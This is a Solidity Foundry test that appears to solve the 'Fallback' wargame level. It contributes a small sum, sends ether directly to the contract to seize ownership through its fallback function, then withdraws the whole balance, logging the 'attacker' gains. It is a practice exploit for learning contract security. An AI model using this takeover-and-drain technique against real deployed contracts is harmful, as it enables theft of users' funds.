// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Test, console} from "forge-std/Test.sol";
import {Fallback} from "../src/Fallback.sol";

contract FallbackTest is Test {
    Fallback fallBack;
    address user = makeAddr("user");
    uint256 private constant userBalance = 1 ether;

    function setUp() public {
        fallBack = new Fallback();
        vm.deal(user, userBalance); 
    }

    function testTakeOwnershipAndWithdrawAllFunds() public {
        address previousOwner = fallBack.owner();
        vm.prank(previousOwner);
        uint256 ownerContribution = fallBack.getContribution();

        vm.startPrank(user);
        fallBack.contribute{value: 0.0001 ether}();
        (bool success, ) = address(fallBack).call{value: 0.1 ether}("");
        require(success, "Transfer failed");
        address newOwner = fallBack.owner();
        uint256 attackerContribution = fallBack.getContribution();
        uint256 previousContractBalance = address(fallBack).balance;
        fallBack.withdraw();
        uint256 newContractBalance = address(fallBack).balance;
        uint256 ownerBalance = address(user).balance;
        vm.stopPrank();

        console.log("Previous owner: ", previousOwner);
        console.log("Owner contribution: ", ownerContribution);
        console.log("New owner: ", newOwner);
        console.log("Attacker contribution: ", attackerContribution);
        console.log("Previous contract balance: ", previousContractBalance);
        console.log("New contract balance: ", newContractBalance);
        console.log("Attacker balance: ", ownerBalance);
        assert(newOwner != previousOwner);
    }
}